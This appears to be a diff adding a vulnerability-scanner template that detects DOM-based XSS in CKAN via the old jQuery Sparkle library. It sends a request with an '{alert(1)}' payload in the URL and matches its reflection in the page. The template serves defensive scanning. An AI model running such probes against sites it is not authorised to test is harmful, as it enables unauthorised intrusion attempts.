@@ -1,0 +1,26 @@
+id: ckan-dom-based-xss
+info:
+  author: dhiyaneshDk
+  description: CKAN uses the old jQuery Sparkle library which is vulnerable to DOM
+    Based XSS.
+  name: CKAN DOM Based XSS
+  reference:
+  - https://github.com/ckan/ckan/blob/b9e45e2723d4abd70fa72b16ec4a0bebc795c56b/ckan/public/base/javascript/view-filters.js#L27
+  severity: medium
+  tags: dom,xss
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - type: word
+    words:
+    - <option value="/en/?{alert(1)}" selected="selected">
+  - part: header
+    type: word
+    words:
+    - text/html
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/?{alert(1)}'
